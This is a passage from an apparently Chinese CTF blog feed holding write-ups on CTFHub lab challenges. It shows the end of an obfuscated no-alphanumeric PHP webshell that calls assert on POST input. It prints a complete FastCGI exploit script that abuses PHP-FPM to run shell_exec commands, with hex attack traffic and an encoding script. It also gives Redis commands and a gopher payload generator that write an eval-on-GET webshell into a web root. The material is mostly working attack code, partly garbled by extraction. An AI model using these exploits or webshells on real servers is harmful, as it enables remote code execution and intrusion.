class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// P</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ASSERT($_POST[_]);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果：</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg" alt="14872701052595.jpg"></p><blockquote><p>详见：</p><p><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/penetration/webshell-without-alphanum.html</a> </p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p></blockquote><h2 id="待续。。。"><a href="#待续。。。" class="headerlink" title="待续。。。"></a>待续。。。</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub中关于FastCGI协议的SSRF</title>
      <link href="/2021/09/10/ctfhub-zhong-guan-yu-fastcgi-xie-yi-de-ssrf/"/>
      <url>/2021/09/10/ctfhub-zhong-guan-yu-fastcgi-xie-yi-de-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><ol><li><p>监听9000端口，因为PHP-FPM默认监听9000端口</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719051814927.png" alt="image-20210719051814927"></p><p>exp如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ssrf_fastcgi_fpm.py</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> random<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token comment" spellcheck="true"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>   def bchr(i):<br>       if PY2:<br>           return force_bytes(chr(i))<br>       else:<br>           return bytes([i])</p><p>   def bord(c):<br>       if isinstance(c, int):<br>           return c<br>       else:<br>           return ord(c)</p><p>   def force_bytes(s):<br>       if isinstance(s, bytes):<br>           return s<br>       else:<br>           return s.encode(‘utf-8’, ‘strict’)</p><p>   def force_text(s):<br>       if issubclass(type(s), str):<br>           return s<br>       if isinstance(s, bytes):<br>           s = str(s, ‘utf-8’, ‘strict’)<br>       else:<br>           s = str(s)<br>       return s</p><p>   class FastCGIClient:<br>       “””A Fast-CGI Client for Python”””</p><pre><code>   # private   __FCGI_VERSION = 1   __FCGI_ROLE_RESPONDER = 1   __FCGI_ROLE_AUTHORIZER = 2   __FCGI_ROLE_FILTER = 3   __FCGI_TYPE_BEGIN = 1   __FCGI_TYPE_ABORT = 2   __FCGI_TYPE_END = 3   __FCGI_TYPE_PARAMS = 4   __FCGI_TYPE_STDIN = 5   __FCGI_TYPE_STDOUT = 6   __FCGI_TYPE_STDERR = 7   __FCGI_TYPE_DATA = 8   __FCGI_TYPE_GETVALUES = 9   __FCGI_TYPE_GETVALUES_RESULT = 10   __FCGI_TYPE_UNKOWNTYPE = 11   __FCGI_HEADER_SIZE = 8   # request state   FCGI_STATE_SEND = 1   FCGI_STATE_ERROR = 2   FCGI_STATE_SUCCESS = 3   def __init__(self, host, port, timeout, keepalive):       self.host = host       self.port = port       self.timeout = timeout       if keepalive:           self.keepalive = 1       else:           self.keepalive = 0       self.sock = None       self.requests = dict()   def __connect(self):       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       self.sock.settimeout(self.timeout)       self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)       # if self.keepalive:       #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)       # else:       #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)       try:           self.sock.connect((self.host, int(self.port)))       except socket.error as msg:           self.sock.close()           self.sock = None           print(repr(msg))           return False       return True   def __encodeFastCGIRecord(self, fcgi_type, content, requestid):       length = len(content)       buf = bchr(FastCGIClient.__FCGI_VERSION) \              + bchr(fcgi_type) \              + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \              + bchr(requestid &amp; 0xFF) \              + bchr((length &gt;&gt; 8) &amp; 0xFF) \              + bchr(length &amp; 0xFF) \              + bchr(0) \              + bchr(0) \              + content       return buf   def __encodeNameValueParams(self, name, value):       nLen = len(name)       vLen = len(value)       record = b''       if nLen &lt; 128:           record += bchr(nLen)       else:           record += bchr((nLen &gt;&gt; 24) | 0x80) \                     + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                     + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                     + bchr(nLen &amp; 0xFF)       if vLen &lt; 128:           record += bchr(vLen)       else:           record += bchr((vLen &gt;&gt; 24) | 0x80) \                     + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                     + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                     + bchr(vLen &amp; 0xFF)       return record + name + value   def __decodeFastCGIHeader(self, stream):       header = dict()       header['version'] = bord(stream[0])       header['type'] = bord(stream[1])       header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])       header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])       header['paddingLength'] = bord(stream[6])       header['reserved'] = bord(stream[7])       return header   def __decodeFastCGIRecord(self, buffer):       header = buffer.read(int(self.__FCGI_HEADER_SIZE))       if not header:           return False       else:           record = self.__decodeFastCGIHeader(header)           record['content'] = b''           if 'contentLength' in record.keys():               contentLength = int(record['contentLength'])               record['content'] += buffer.read(contentLength)           if 'paddingLength' in record.keys():               skiped = buffer.read(int(record['paddingLength']))           return record   def request(self, nameValuePairs={}, post=''):       if not self.__connect():           print('connect failure! please check your fasctcgi-server !!')           return       requestId = random.randint(1, (1 &lt;&lt; 16) - 1)       self.requests[requestId] = dict()       request = b""       beginFCGIRecordContent = bchr(0) \                                + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                + bchr(self.keepalive) \                                + bchr(0) * 5       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                             beginFCGIRecordContent, requestId)       paramsRecord = b''       if nameValuePairs:           for (name, value) in nameValuePairs.items():               name = force_bytes(name)               value = force_bytes(value)               paramsRecord += self.__encodeNameValueParams(name, value)       if paramsRecord:           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)       if post:           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)       request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)       self.sock.send(request)       self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND       self.requests[requestId]['response'] = b''       return self.__waitForResponse(requestId)   def __waitForResponse(self, requestId):       data = b''       while True:           buf = self.sock.recv(512)           if not len(buf):               break           data += buf       data = BytesIO(data)       while True:           response = self.__decodeFastCGIRecord(data)           if not response:               break           if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \                   or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:               if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:                   self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR               if requestId == int(response['requestId']):                   self.requests[requestId]['response'] += response['content']           if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:               self.requests[requestId]       return self.requests[requestId]['response']   def __repr__(self):       return "fastcgi connect host:{} port:{}".format(self.host, self.port)</code></pre><p>   if <strong>name</strong> == ‘<strong>main</strong>‘:<br>       parser = argparse.ArgumentParser(description=’Php-fpm code execution vulnerability client.’)<br>       parser.add_argument(‘host’, help=’Target host, such as 127.0.0.1’)<br>       parser.add_argument(‘file’, help=’A php file absolute path, such as /usr/local/lib/php/System.php’)<br>       parser.add_argument(‘-c’, ‘–code’, help=’What php code your want to execute’, default=’<!--?php phpinfo(); exit; ?-->‘)<br>       parser.add_argument(‘-p’, ‘–port’, help=’FastCGI port’, default=9000, type=int)</p><pre><code>   args = parser.parse_args()   client = FastCGIClient(args.host, args.port, 3, 0)   params = dict()   documentRoot = "/"   uri = args.file   content = args.code   params = {       'GATEWAY_INTERFACE': 'FastCGI/1.0',       'REQUEST_METHOD': 'POST',       'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),       'SCRIPT_NAME': uri,       'QUERY_STRING': '',       'REQUEST_URI': uri,       'DOCUMENT_ROOT': documentRoot,       'SERVER_SOFTWARE': 'php/fcgiclient',       'REMOTE_ADDR': '127.0.0.1',       'REMOTE_PORT': '9985',       'SERVER_ADDR': '127.0.0.1',       'SERVER_PORT': '80',       'SERVER_NAME': "localhost",       'SERVER_PROTOCOL': 'HTTP/1.1',       'CONTENT_TYPE': 'application/text',       'CONTENT_LENGTH': "%d" % len(content),       'PHP_VALUE': 'auto_prepend_file = php://input',       'PHP_ADMIN_VALUE': 'allow_url_include = On'   }   response = client.request(params, content)</code></pre><pre><code>   以`py fpm.py -c [php语句] -p port host path `格式执行即可2. 首先执行`ls /`命令   ```bash   python ssrf_fastcgi_fpm.py -c "&lt;?php var_dump(shell_exec('ls /'));?&gt;" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code></pre><p>   得到利用exp获得的攻击流量1.txt，用010editor打开<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719052340479.png" alt="image-20210719052340479"></p><p>   以十六进制文本的形式复制下来，用以下脚本进行url编码</p><pre class="line-numbers language-python"><code class="language-python">   a<span class="token operator">=</span><span class="token triple-quoted-string string">'''   01 01 11 C4 00 08 00 00 00 01 00 00 00 00 00 00   01 04 11 C4 01 E7 00 00 11 0B 47 41 54 45 57 41   59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43   47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F   4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49   50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F   6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45   41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E   41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69   62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00   51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45   51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F   63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52   2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52   4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46   54 57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69   65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52   31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54   45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56   45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31   0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B   09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61   6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52   4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10   43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C   69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F   4E 54 45 4E 54 5F 4C 45 4E 47 54 48 33 37 09 1F   50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72   65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70   3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44   4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75   72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01   04 11 C4 00 00 00 00 01 05 11 C4 00 25 00 00 3C   3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68   65 6C 6C 5F 65 78 65 63 28 27 6C 73 20 2F 27 29   29 3B 3F 3E 01 05 11 C4 00 00 00 00   '''</span>   a<span class="token operator">=</span>a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>   a<span class="token operator">=</span>a<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>   b<span class="token operator">=</span><span class="token string">''</span>   length<span class="token operator">=</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       b<span class="token operator">+=</span><span class="token string">'%'</span>       b<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>       b<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   得到url编码后的攻击流量</p><pre><codecode></pre><p>   但由于要进行两次请求，因此还要进行一次url编码，最终结果如下</p><pre><codecode></pre><ol start="3"><li><p>由于PHP-FPM默认监听9000端口，所以攻击的端口也为9000</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719053932114.png" alt="image-20210719053932114"></p><p>成功执行</p></li><li><p>接着进行同样的步骤执行<code>cat /flag_49b379d8b061225b3ed4bc32986b087f</code></p><p>两次url编码后的攻击流量为</p><pre><codecode></pre><p>成功执行</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719055237991.png" alt="image-20210719055237991"></p></li><li><p>另外可以使用Gopherus这个工具，更简单一些</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062324937.png" alt="image-20210719062324937"></p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062711350.png" alt="image-20210719062711350"></p><p>此处payload要再次进行编码才能使用</p></li></ol><p>总结流程：</p><p><strong>1.探测开放端口（这道题不用）</strong></p><p><strong>2.本地构造攻击流量，通过监听端口然后url转码的形式</strong></p><p><strong>3.ssrf攻击</strong></p><blockquote><p>参考</p><p><a href="https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/" target="_blank" rel="noopener">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p><p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="noopener">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p><p><a href="https://blog.csdn.net/shreck66/article/details/50355729" target="_blank" rel="noopener">https://blog.csdn.net/shreck66/article/details/50355729</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/108589988" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/108589988</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub中SSRF打Redis</title>
      <link href="/2021/09/10/ctfhub-zhong-ssrf-da-redis/"/>
      <url>/2021/09/10/ctfhub-zhong-ssrf-da-redis/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Redis相关协议</p><p><a href="https://www.redis.com.cn/redis-configuration/" target="_blank" rel="noopener">Redis配置详解</a></p><p><a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a></p></blockquote><p>这题进行写文件后执行命令。</p><p>Redis命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">flushall<span class="token keyword">set</span> 1 <span class="token string">'&lt;?php eval(<span class="token variable">$_GET</span>["cmd"]);?>'</span>config <span class="token keyword">set</span> <span class="token function">dir</span> /var/www/htmlconfig <span class="token keyword">set</span> dbfilename shell.phpsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是我是直接拿带佬们的脚本打的，大概看了一下Redis原理与协议还有它的格式，需要找个时间自己动手写一下exp加深印象。</p><p>稍微改了一下，能在python3.8跑，原exp应该是在python2环境中执行</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseprotocol<span class="token operator">=</span><span class="token string">"gopher://"</span>ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>port<span class="token operator">=</span><span class="token string">"6379"</span>shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>filename<span class="token operator">=</span><span class="token string">"shell.php"</span>path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>passwd<span class="token operator">=</span><span class="token string">""</span>cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>     <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token string">"save"</span>     <span class="token punctuation">]</span><span class="token keyword">if</span> passwd<span class="token punctuation">:</span>    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span><span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">=</span><span class="token string">""</span>    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>    cmd<span class="token operator">+=</span>CRLF    <span class="token keyword">return</span> cmd<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>        payload <span class="token operator">+=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" 